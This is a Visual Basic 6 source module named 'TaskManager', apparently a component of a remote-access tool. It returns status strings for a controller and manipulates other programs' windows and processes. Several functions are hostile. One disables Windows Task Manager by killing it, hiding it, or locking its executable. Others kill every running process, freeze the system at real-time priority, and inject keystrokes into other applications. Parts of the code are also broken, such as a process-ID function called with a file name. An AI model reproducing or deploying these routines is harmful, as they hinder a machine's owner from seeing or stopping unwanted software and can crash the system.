Attribute VB_Name = "TaskManager"
Option Explicit
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function DestroyWindow Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Private Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessID As Long) As Long
Private Declare Function OpenThread Lib "Kernel32.dll" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Boolean, ByVal dwThreadId As Long) As Long
Private Declare Function SuspendThread Lib "Kernel32.dll" (ByVal hThread As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Private Declare Function Process32First Lib "kernel32" (ByVal HSnapshot As Long, lppe As Any) As Long
Private Declare Function Process32Next Lib "kernel32" (ByVal HSnapshot As Long, lppe As Any) As Long
Private Declare Function Thread32First Lib "Kernel32.dll" (ByVal HSnapshot As Long, ByRef lpte As THREADENTRY32) As Boolean
Private Declare Function Thread32Next Lib "Kernel32.dll" (ByVal HSnapshot As Long, ByRef lpte As THREADENTRY32) As Boolean
Private Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal fEnable As Long) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Long) As Long
Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Private Declare Function BringWindowToTop Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function SetWindowText Lib "user32" Alias "SetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String) As Long
Private Declare Function FlashWindow Lib "user32" (ByVal hwnd As Long, ByVal bInvert As Long) As Long
Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Declare Function IsWindow Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function SetPriorityClass Lib "Kernel32.dll" (ByVal hProcess As Long, ByVal dwPriorityClass As Long) As Long
Private Declare Function GetPriorityClass Lib "kernel32" (ByVal hProcess As Long) As Long
Private Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal HSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal HSnapshot As Long, uProcess As PROCESSENTRY32) As Long

Private Const TH32CS_SNAPHEAPLIST = &H1
Private Const TH32CS_SNAPPROCESS = &H2
Private Const TH32CS_SNAPTHREAD = &H4
Private Const TH32CS_SNAPMODULE = &H8
Private Const TH32CS_SNAPALL = (TH32CS_SNAPHEAPLIST + TH32CS_SNAPPROCESS + TH32CS_SNAPTHREAD + TH32CS_SNAPMODULE)
Private Const TH32CS_INHERIT = &H80000000
Private Const HWND_NOTOPMOST = -2
Private Const HWND_TOPMOST = -1
Private Const MAX_PATH = 260
' Process Access
Private Const PROCESS_ALL_ACCESS = &H1F0FFF
Private Const PROCESS_QUERY_INFORMATION = &H400
Private Const PROCESS_TERMINATE = &H1
Private Const PROCESS_SET_INFORMATION = &H200
Private Const CREATE_SUSPENDED = &H4
Private Const THREAD_SUSPEND_RESUME As Long = &H2
' ShowWindow commands
Private Const SW_HIDE = 0
Private Const SW_SHOWNORMAL = 1
Private Const SW_NORMAL = 1
Private Const SW_SHOWMINIMIZED = 2
Private Const SW_SHOWMAXIMIZED = 3
Private Const SW_MAXIMIZE = 3
Private Const SW_SHOWNOACTIVATE = 4
Private Const SW_SHOW = 5
Private Const SW_MINIMIZE = 6
Private Const SW_SHOWMINNOACTIVE = 7
Private Const SW_SHOWNA = 8
Private Const SW_RESTORE = 9
Private Const SW_SHOWDEFAULT = 10
Private Const SW_MAX = 10
' Window messages
Private Const WM_CLOSE = &H10
Private Const SWP_NOMOVE = &H2
Private Const SWP_NOSIZE = &H1
Private Const Flags = SWP_NOSIZE Or SWP_NOMOVE
' ExWindowStyles
Private Const WS_EX_TOPMOST = &H8&

' Type Represent The Process Block In The 32bit Windows Systems (9X,NT,XP)
Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile As String * MAX_PATH
End Type
Private Type THREADENTRY32
    dwSize As Long
    cntUsage As Long
    th32ThreadID As Long
    th32OwnerProcessID As Long
    tpBasePri As Long
    tpDeltaPri As Long
    dwFlags As Long
End Type
' Enum Represent the Differant Priority Levels Of The Processes
Private Enum PriorityLevels
   REALTIME_PRIORITY_CLASS = &H100
   HIGH_PRIORITY_CLASS = &H80
   ABOVE_NORMAL_PRIORITY_CLASS = &H8000
   NORMAL_PRIORITY_CLASS = &H20
   BELOW_NORMAL_PRIORITY_CLASS = &H4000
   IDLE_PRIORITY_CLASS = &H40
End Enum
Private TaskmgrFileNum As Integer 'Task manager file number (when it be file-handeled
Private IsFreezed As Boolean, PrevPriority As Byte
Private ThrdCnt As Long 'Number of threads per the process
'------------------------------------------------<< Public Functions >>---------------------------------
Public Function GetTasks() As String
On Error GoTo Failed
    'Function Gets The Tasks(Applications) Information
    'Task Title,Task Handle,RelatedProcessHandle
     Dim Title As String, RethWnd As Long, MyProcHandle As Long
    'State is the window state (Normal-Hidden-Disabled-HiddenDisabled)
     Dim I As Integer, Item As String, RetStr As String 'General Counter
     Dim En As Byte, Vs As Byte, State As Byte
     For I = 1 To 10000 'I Is The Process Handle Not The Hwnd
        Title$ = GetWindowTitle(I)
        RethWnd = FindWindow(vbNullString, Title$) 'RethWnd is The Real Handle of the window
        If Title$ <> vbNullString And RethWnd <> 0 Then
           'Check Visability and Enableity
            En = (IsWindowEnabled(I) = 0) 'Windows Disabled
            Vs = (IsWindowVisible(I) = 0) 'Windows Hidden
            If (En And Vs) Then
                State = 3
            ElseIf (En) Then
                State = 2
            ElseIf (Vs) Then
                State = 1
            Else
                State = 0
            End If
            Item = Trim$(Title)
            Item = Item & State '1 Byte
            Item = Item & Char_Representation(Abs(RethWnd)) 'Handle 4 Bytes
                GetWindowThreadProcessId RethWnd, MyProcHandle
            Item = Item & Char_Representation(Abs(MyProcHandle)) 'MyProcHandle 4 Bytes
           'Add The Item
            RetStr = RetStr & Item & vbCrLf
        End If
    Next
    If Len(RetStr) > 0 Then
        GetTasks = "T" & RetStr
    Else
        err.Raise 101, , "No Applications Found!"
    End If
    Exit Function
Failed:
    GetTasks = "F" & err.Description
End Function
Public Function NewTask(NewTaskString As String, Tstate As Integer) As String
    'Shell The Comming String
    On Error GoTo Failed
    Dim retVal As Long
    retVal = Shell(NewTaskString, Tstate)
        If retVal Then
            NewTask = "T"
        Else
            err.Raise 119, , "Unable To Shell That Task!"
        End If
        'Delay (1) 'Delay About 1 sec
    Exit Function
Failed:
    NewTask = "F" & NewTaskString & Separator_Char & err.Description
End Function
Public Function RenameTask(OldTitle As String, NewTitle As String) As String
    On Error GoTo Failed
    Dim IRet As Long 'Return Value
    Dim ShadowHandle As Long
    ShadowHandle = GetShadowHandle(OldTitle)
   'Check The Title Found
    If ShadowHandle > 0 Then
        'Rename
         If Len(Trim$(NewTitle)) > 0 Then
            'Valid New Title
             IRet = SetWindowText(ShadowHandle, NewTitle)
             If IRet > 0 Then
                RenameTask = "T"
             Else
                err.Raise 111, , "Cann't Rename Window"
             End If
         Else
            err.Raise 112, , "Invalid New Title Name"
         End If
    Else
        err.Raise 111, , "Cann't Rename Window"
    End If
    Exit Function
Failed:
    RenameTask = "F" & err.Description
End Function
Public Function EndTask(TaskStr As String) As String
    On Error GoTo Failed
    'Hwnd here is The Process Handler
    Dim ThreadIDX As Long
    Dim PROCESSIDX As Long
    Dim EXCODE As Long
    Dim PROCESS As Long
    Dim hwnd As Long
   'Fetch The Handle of The Window Own That Title
    hwnd = FindWindow(vbNullString, TaskStr)
    If hwnd > 0 Then
        'Get The ThreadProcessID oF That Window
         ThreadIDX = GetWindowThreadProcessId(hwnd, PROCESSIDX) 'PROCESSIDX Accept The Idetefier
        'Try To HaveAccess To That Process
         PROCESS = OpenProcess(PROCESS_ALL_ACCESS, 0, PROCESSIDX)
        'Get It's Exit Code
         If PROCESS > 0 Then
             GetExitCodeProcess PROCESS, EXCODE
            'And Terminate ...
             If TerminateProcess(PROCESS, EXCODE) > 0 Then
                 EndTask = "T"
             Else
                 err.Raise 120, , "Unable To End That Tast!"
             End If
         Else
             err.Raise 120, , "Unable To Get Access To That Tast!"
         End If
         CloseHandle PROCESS
         DoEvents
    End If
    Exit Function
Failed:
    EndTask = "F" & TaskStr & Separator_Char & err.Description
End Function
Public Function EnableTask(TaskStr As String) As String
    On Error GoTo Failed
    Dim IRet As Long
    IRet = GetShadowHandle(TaskStr)
    If IRet > 0 Then
        IRet = EnableWindow(IRet, True)
        EnableTask = "T"
    Else
        err.Raise 102, , "Access Denied!"
    End If
    Exit Function
Failed:
    EnableTask = "F" & TaskStr & Separator_Char & err.Description
End Function
Public Function DisableTask(TaskStr As String) As String
    On Error GoTo Failed
    Dim IRet As Long
    IRet = GetShadowHandle(TaskStr)
    If IRet > 0 Then
        IRet = EnableWindow(IRet, False)
        DisableTask = "T"
    Else
        err.Raise 102, , "Access Denied!"
    End If
    Exit Function
Failed:
    DisableTask = "F" & TaskStr & Separator_Char & err.Description
End Function
Public Function ShowTask(TaskStr As String) As String
    On Error GoTo Failed
    Dim IRet As Long
    IRet = GetShadowHandle(TaskStr)
    If IRet > 0 Then
        IRet = SendMsgToWindow(IRet, 1)
        ShowTask = "T"
    Else
        err.Raise 102, , "Access Denied!"
    End If
    Exit Function
Failed:
    ShowTask = "F" & TaskStr & Separator_Char & err.Description
End Function
Public Function HideTask(TaskStr As String) As String
    On Error GoTo Failed
    Dim IRet As Long
    IRet = GetShadowHandle(TaskStr)
    If IRet > 0 Then
        IRet = SendMsgToWindow(IRet, 2)
        HideTask = "T"
    Else
        err.Raise 102, , "Access Denied!"
    End If
    Exit Function
Failed:
    HideTask = "F" & TaskStr & Separator_Char & err.Description
End Function
Public Function MaximizeTask(TaskStr As String) As String
    On Error GoTo Failed
    Dim IRet As Long
    IRet = GetShadowHandle(TaskStr)
    If IRet > 0 Then
        IRet = SendMsgToWindow(IRet, 3)
        MaximizeTask = "T"
    Else
        err.Raise 102, , "Access Denied!"
    End If
    Exit Function
Failed:
    MaximizeTask = "F" & TaskStr & Separator_Char & err.Description
End Function
Public Function MinimizeTask(TaskStr As String) As String
    On Error GoTo Failed
    Dim IRet As Long
    IRet = GetShadowHandle(TaskStr)
    If IRet > 0 Then
        IRet = SendMsgToWindow(IRet, 4)
        MinimizeTask = "T"
    Else
        err.Raise 102, , "Access Denied!"
    End If
    Exit Function
Failed:
    MinimizeTask = "F" & TaskStr & Separator_Char & err.Description
End Function
Public Function RestoreTask(TaskStr As String) As String
    On Error GoTo Failed
    Dim IRet As Long
    IRet = GetShadowHandle(TaskStr)
    If IRet > 0 Then
        IRet = SendMsgToWindow(IRet, 5)
        RestoreTask = "T"
    Else
        err.Raise 102, , "Access Denied!"
    End If
    Exit Function
Failed:
    RestoreTask = "F" & TaskStr & Separator_Char & err.Description
End Function
Public Function MakeOnTop(TaskStr As String) As String
    On Error GoTo Failed
    Dim IRet As Long
    IRet = GetShadowHandle(TaskStr)
    If IRet > 0 Then
        IRet = SetWindowPos(IRet, HWND_TOPMOST, 0, 0, 0, 0, Flags)
        MakeOnTop = "T"
    Else
        err.Raise 109, , "Access Denied!"
    End If
    Exit Function
Failed:
    MakeOnTop = "F" & TaskStr & Separator_Char & err.Description
End Function
Public Function MakeNotOnTop(TaskStr As String) As String
    On Error GoTo Failed
    Dim IRet As Long
    IRet = GetShadowHandle(TaskStr)
    If IRet > 0 Then
        IRet = SetWindowPos(IRet, HWND_NOTOPMOST, 0, 0, 0, 0, Flags)
        MakeNotOnTop = "T"
    Else
        err.Raise 109, , "Access Denied!"
    End If
    Exit Function
Failed:
    MakeNotOnTop = "F" & TaskStr & Separator_Char & err.Description
End Function
Public Function FlashTaskWindow(TaskStr As String) As String
    On Error GoTo Failed
    Dim IRet As Long
    IRet = GetShadowHandle(TaskStr)
    If IRet > 0 Then
        FlashWindow IRet, 1
        FlashTaskWindow = "T"
    Else
        err.Raise 109, , "Access Denied!"
    End If
    Exit Function
Failed:
    FlashTaskWindow = "F" & TaskStr & Separator_Char & err.Description
End Function
Public Function SetTaskFocus(TaskStr As String) As Boolean
    On Error GoTo Failed
    Dim ShadowHandel As Long, IRet As Long
    ShadowHandel = GetShadowHandle(TaskStr)
    If ShadowHandel > 0 Then
         ShowWindow ShadowHandel, SW_MINIMIZE
         ShowWindow ShadowHandel, SW_NORMAL
         AppActivate TaskStr
         SetTaskFocus = True
    Else
        err.Raise 109, , "Access Denied!"
    End If
    Exit Function
Failed:
    SetTaskFocus = False
End Function
Public Function SendKeysToTask(TaskStr As String, Keys As String) As String
    On Error GoTo Failed
        'Check If No Keys Passed
         If Len(Keys) > 0 Then
             If SetTaskFocus(TaskStr) = True Then
                DoEvents
                SendKeys Keys
             Else
                err.Raise 117, , "Cann't SetFocus To That Task!"
             End If
         Else
             err.Raise 117, , "Zero-Length Keys Passed!"
         End If
         SendKeysToTask = "T" & "The Keys You Sended Is Successfully Passed To That Task."
    Exit Function
Failed:
    SendKeysToTask = "F" & TaskStr & Separator_Char & err.Description
End Function
Public Function DisbleWindowsTaskManger() As String
   'Disbles Windows Task Manager [CTRL + ALT + DEL]
   'Will Disable The TaskManager application it's self from aility to be executed
   'Also May Execute The Tasmanager and Hide It , So That it cann't ever never be executed again
   'But i'll try to avoid any conflict may happen between these methods :),Man Go Ahead!
   'This Function Works In Windows NT And XP Families
    On Error GoTo Failed
    If OSPlatForm <> Platform_Windows_NT_2K_XP Then
        'Not NT&XP System
         DisableKeys True
         DisbleWindowsTaskManger = " Windows TasManager Is successfuully Disabled."
         Exit Function
    End If
   'Resume Work
   'Check If TaskManager Working Or Not ??
    Dim CurrentProcesses() As String, I As Integer
    STREnumProcesses CurrentProcesses 'Enumrate all processes
    For I = 0 To UBound(CurrentProcesses)
        If LCase$(CurrentProcesses(I)) = "taskmgr.exe" Then 'The Task Manager exeName
            'Terminate TaskManager
             If Left$(EndProcess("taskmgr.exe"), 1) = "F" Then
                'Failed To Terminate Taskmanager then Hide It
                 If Left$(HideTask("Windows Task Manager"), 1) = "T" Then
                    DisbleWindowsTaskManger = " Windows TasManager Is successfuully Disabled."
                    Exit Function
                 Else
                    GoTo Failed
                 End If
             End If
             Exit For
        End If
    Next
        'Open The File For Append
         TaskmgrFileNum = FreeFile
         Open Sys_dir & "taskmgr.exe" For Append As #TaskmgrFileNum
         DisbleWindowsTaskManger = " Windows TasManager Is successfuully Disabled."
         Exit Function
Failed:
        DisbleWindowsTaskManger = " Windows TasManager Is Failed To Be Disabled!"
End Function
Public Function EnableWindowsTaskManger() As String
    'Enables Windows Task Manager [CTRL + ALT + DEL]
    'This Function Works In Windows NT And XP Families
    On Error GoTo Failed
    If OSPlatForm <> Platform_Windows_NT_2K_XP Then
        'Not NT&XP System
         DisableKeys False
         EnableWindowsTaskManger = " Windows TasManager Is successfuully Enabled."
         Exit Function
    End If
   'Resume Work
   'Check If TaskManager Working Or Not ??
    Dim CurrentProcesses() As String, I As Integer, ResumeWork As Boolean
    STREnumProcesses CurrentProcesses 'Enumrate all processes
    For I = 0 To UBound(CurrentProcesses)
        If LCase$(CurrentProcesses(I)) = "taskmgr.exe" Then 'The Task Manager exeName
            'Show It
             If Left$(ShowTask("Windows Task Manager"), 1) = "T" Then
                EnableWindowsTaskManger = " Windows Task Manager Is Succeffully Enabled"
                Exit Function
             End If
        End If
    Next I
   'Task Mnager is Not working right now , so Close it's handle if it present
    Close #TaskmgrFileNum
    EnableWindowsTaskManger = " Windows Task Manager Is Succeffully Enabled"
    Exit Function
Failed:
    EnableWindowsTaskManger = " Windows Task Manager Is Failed To Be Enabled"
End Function
Public Function UnFreezSystem() As String
    On Error GoTo Failed
    'Enable The Keyboard and mouse Inputs To The System
     If IsFreezed = True Then
        IsFreezed = False
       'Set The Previous priority
        SetPriorityLevel GetCurrentProcessId(), PrevPriority
        UnFreezSystem = " UnFreezing Operation Succeed"
     Else
        UnFreezSystem = " Already UnFreezed!"
     End If
     Exit Function
Failed:
     UnFreezSystem = " Unable To UnFreez The System!"
End Function
Public Function FreezSystem() As String
    'Diable The Keyboard And Mouse Inputes To The System
     Dim InfCounter As Integer
     If IsFreezed = False Then
       'Get The Current Prioriy
        PrevPriority = GetPriorityLevel(GetCurrentProcessId())
       'Set To RealTime Priority
        If PrevPriority <> 5 Then
            If SetPriorityLevel(GetCurrentProcessId(), 5) = False Then
                FreezSystem = " Unable To Freez The System!"
                Exit Function
            End If
        End If
        IsFreezed = True
       'The Freezed Loop
        For InfCounter = 0 To 10000
            If IsFreezed = False Then Exit For
            If InfCounter = 9999 Then
                InfCounter = 0
            End If
        Next InfCounter
     End If
End Function
Public Function GetProcesses() As String 'Best Optmized String Maniplation
On Error GoTo Failed
   'Function Return The Processes Information
   'Process Title,ProcessID,ProcessParentID,NoOfThreads and Current Periority
    Dim HSnapshot As Long, lRet As Long, p As PROCESSENTRY32
    Dim Item As String, ReturnStr As String
    p.dwSize = Len(p) 'Size Of The Processes Structure
    HSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, ByVal 0) 'Take The SnapShot Of The Processes System
    If HSnapshot Then
        lRet = Process32First(HSnapshot, p) 'Fetch First Process
        Do While lRet
            Item = Mid$(p.szExeFile, 1, InStr(1, p.szExeFile, Chr$(0)) - 1) 'Fit The Name Of The Process
            Item = Item & GetPriorityLevel(p.th32ProcessID) 'Periority = 1 byte
            Item = Item & Char_Representation(Abs(p.th32ProcessID)) 'ProcessID = 4 bytes
            Item = Item & Char_Representation(Abs(p.th32ParentProcessID)) 'ParentProcessID = 4 bytes
            Item = Item & Char_Representation(p.cntThreads) 'No. Of Threads = 4 bytes
            ReturnStr = ReturnStr & Item & vbCrLf
            lRet = Process32Next(HSnapshot, p)
        Loop
        lRet = CloseHandle(HSnapshot) 'Close The SnapShot
       'Rteurn The Processes Discription
        If Len(ReturnStr) > 0 Then
            GetProcesses = "T" & ReturnStr
        Else
            err.Raise 100, , "No Processes Found!"
        End If
    Exit Function
Failed:
    GetProcesses = "F" & err.Description
    End If
End Function
Public Function EndProcess(ProcessID As Long) As String
    On Error GoTo Failed
    Dim lProcessHandle As Long
    If ProcessID > 0 Then
        'Check If WIN9X processes
         If OSPlatForm = Platform_Windows_95_98_ME Then ProcessID = ProcessID * -1
         Dim EXCODE As Long, PROCESS As Long
        'Give All Access Levels To The Process
         PROCESS = OpenProcess(PROCESS_ALL_ACCESS, 0, ProcessID)
             If PROCESS > 0 Then
                'Access Succeffully Gained
                 GetExitCodeProcess PROCESS, EXCODE
                 TerminateProcess PROCESS, EXCODE
                 DoEvents
                 EndProcess = "T"
             Else
                 err.Raise 116, , "Cann't Get Access To That Process"
             End If
         CloseHandle PROCESS
    Else
         err.Raise 115, , "Cann't Find That Process!"
    End If
    Exit Function
Failed:
    EndProcess = "F" & ProcessID & Separator_Char & err.Description
End Function
Public Function SuspendProcess(ProcID As Long) As String
Dim Ctr As Long, hThread As Long
Dim TheThreads() As THREADENTRY32
Call GetThreads(ProcID, TheThreads)
If ThrdCnt Then
    For Ctr = 0 To ThrdCnt
        If TheThreads(Ctr).th32OwnerProcessID = ProcID Then
            hThread = OpenThread(THREAD_SUSPEND_RESUME, 0, CLng(TheThreads(Ctr).th32ThreadID))
            SuspendThread (hThread)
        End If
    Next
    SuspendProcess = "T"
Else
    SuspendProcess = "Cann't Susspend this application!"
End If
End Function
Private Sub GetThreads(TheID As Long, TheThreads() As THREADENTRY32)
Dim HSnapshot As Long
Dim ThreadEnt32 As THREADENTRY32
ThrdCnt = 0
HSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, TheID)
ThreadEnt32.dwSize = Len(ThreadEnt32)
    If Thread32First(HSnapshot, ThreadEnt32) = False Then
        Exit Sub
    Else
        ReDim TheThreads(ThrdCnt)
        TheThreads(ThrdCnt) = ThreadEnt32
    End If
    Do
        If Thread32Next(HSnapshot, ThreadEnt32) = False Then
            Exit Do
        Else
            ThrdCnt = ThrdCnt + 1
            ReDim Preserve TheThreads(ThrdCnt)
            TheThreads(ThrdCnt) = ThreadEnt32
        End If
    Loop
End Sub
Public Function SetProcPeriority(ProcessID As Long, NewPriority As Byte) As String
     On Error GoTo Failed
     Dim IRet As Long
     If ProcessID > 0 Then
       'Check If WIN9X processes
        If OSPlatForm = Platform_Windows_95_98_ME Then ProcessID = ProcessID * -1
        If SetPriorityLevel(ProcessID, NewPriority) = True Then
           SetProcPeriority = "T"
        Else
           err.Raise 114, , "Unable To Change The Periority!"
        End If
     Else
        err.Raise 114, , "Cann't Find That Process!"
     End If
     Exit Function
Failed:
     SetProcPeriority = "F" & ProcessID & Separator_Char & err.Description
End Function
Public Function StopAllProc() As String
On Error GoTo Failed
   'Stop All The Processes and tasks Exit In The System
   'The Function Will Avoid To Terminate It's Application
   'Depend On The ProcessKilller "EndProcess()" Function
    On Error Resume Next
   'This Function don't work with WIN9X
    Dim Items() As Long, I As Integer
    EnumProcesses Items 'Enumrate All Processes
   'Item() Array contain All Current Processes
   'The Returned Value Will Be True In Case Of One Process be successfully Endded
    For I = 0 To UBound(Items)
       'Call The Killer Rotiune
        If Items(I) <> Abs(GetCurrentProcessId) Then
            EndProcess Items(I)
        End If
    Next I
    StopAllProc = " Stopping Current Processes Is Successfully Finished." & vbCrLf & "That Dosen't mean all processes is Realy Stopped!"
    Exit Function
Failed:
    StopAllProc = " Error Happen While Trying To Stop All Working Processes."
End Function
'------------------------------------------------<< Private Functions >>--------------------------------
Public Function GetPriorityLevel(ProcessID As Long) As Byte
  'Function Gets The PeriorityLevel Of Passed Process
   Dim IRet As Long, lProcessHandle As Long
        'gets a "hwnd" of sorts, to the process
        lProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, False, ProcessID)
           'get the priority level
            IRet = GetPriorityClass(lProcessHandle)
            If IRet > 0 Then
                IRet = Hex(IRet) 'Hex Value Of The Returned Priority
                Select Case IRet
                       Case 40
                        GetPriorityLevel = 0 'Lowest
                       Case 4000
                        GetPriorityLevel = 1 'Low
                       Case 20
                        GetPriorityLevel = 2 'Normal
                       Case 8000
                        GetPriorityLevel = 3 'High
                       Case 80
                        GetPriorityLevel = 4 'Very High
                       Case 100
                        GetPriorityLevel = 5 'Real
                End Select
            End If
        'Close the handle
         CloseHandle (lProcessHandle)
End Function
Private Function SetPriorityLevel(ProcessID As Long, PerVal As Byte) As Boolean
  'Function Gets The PeriorityLevel Of Passed Process
   Dim IRet As Long, lProcessHandle As Long, NewPer As PriorityLevels
       'gets a "hwnd" of sorts, to the process
        lProcessHandle = OpenProcess(PROCESS_SET_INFORMATION, False, ProcessID)
           'get the priority level
            If lProcessHandle > 0 Then
                Select Case PerVal
                       Case 0 'Lowest
                            NewPer = IDLE_PRIORITY_CLASS
                       Case 1 'Low
                            NewPer = BELOW_NORMAL_PRIORITY_CLASS
                       Case 2 'Normal
                            NewPer = NORMAL_PRIORITY_CLASS
                       Case 3 'High
                            NewPer = ABOVE_NORMAL_PRIORITY_CLASS
                       Case 4 'Very High
                            NewPer = HIGH_PRIORITY_CLASS
                       Case 5 'Real
                            NewPer = REALTIME_PRIORITY_CLASS
                End Select
                IRet = SetPriorityClass(lProcessHandle, NewPer)
                If IRet > 0 Then
                    SetPriorityLevel = True
                Else
                    SetPriorityLevel = False
                End If
            End If
       'Close the handle
        CloseHandle (lProcessHandle)
End Function
Private Function GetWindowTitle(ByVal hwnd As Long) As String
On Error Resume Next
Dim S As String, L As Long
    L = GetWindowTextLength(hwnd)
    S = Space(L + 1)
    GetWindowText hwnd, S, L + 1
    GetWindowTitle = Left$(S, L)
End Function
Private Function GetShadowHandle(TaskTitle As String) As Long
    On Error Resume Next
    GetShadowHandle = FindWindow(vbNullString, TaskTitle)
End Function
Private Function SendMsgToWindow(hWindow, mCase As Long) As Long
Select Case mCase
Dim X As Long
    Case 0 'Close Window
        X = SendMessage(hWindow, WM_CLOSE, 0, 0)
    Case 1 'Show Window
        X = ShowWindow(hWindow, SW_SHOW) 'Show & Activate
        X = ShowWindow(hWindow, SW_SHOWMINNOACTIVE) 'UnActive
    Case 2 'Hide Window
        X = ShowWindow(hWindow, SW_HIDE)
    Case 3 'Maximize Window
        X = ShowWindow(hWindow, SW_MAXIMIZE)
    Case 4 'Minimize Window
        X = ShowWindow(hWindow, SW_MINIMIZE)
    Case 5 'Restore
        X = ShowWindow(hWindow, SW_RESTORE)
End Select
    SendMsgToWindow = X
End Function
Private Function EnumProcesses(ProcessesIDs() As Long)
    On Error Resume Next
    Dim HSnapshot As Long, lRet As Long, p As PROCESSENTRY32
    Dim I As Integer 'General Counter
    p.dwSize = Len(p) 'Size Of The Processes Structure
    HSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, ByVal 0) 'Take The SnapShot Of The Processes System
    If HSnapshot Then
        lRet = Process32First(HSnapshot, p) 'Fetch First Process
        Do While lRet
            ReDim Preserve ProcessesIDs(I)
            ProcessesIDs(I) = Abs(p.th32ProcessID)  'Fit The Name Of The Process
            I = I + 1 'Increment The Array Offset
            lRet = Process32Next(HSnapshot, p)
        Loop
        lRet = CloseHandle(HSnapshot) 'Close The SnapShot
    End If
End Function
Private Function STREnumProcesses(ProcessesNames() As String)
    On Error Resume Next
    Dim HSnapshot As Long, lRet As Long, p As PROCESSENTRY32
    Dim I As Integer 'General Counter
    p.dwSize = Len(p) 'Size Of The Processes Structure
    HSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, ByVal 0) 'Take The SnapShot Of The Processes System
    If HSnapshot Then
        lRet = Process32First(HSnapshot, p) 'Fetch First Process
        Do While lRet
            ReDim Preserve ProcessesNames(I)
            ProcessesNames(I) = Mid$(p.szExeFile, 1, InStr(1, p.szExeFile, Chr$(0)) - 1) 'Fit The Name Of The Process
            I = I + 1 'Increment The Array Offset
            lRet = Process32Next(HSnapshot, p)
        Loop
        lRet = CloseHandle(HSnapshot) 'Close The SnapShot
    End If
End Function
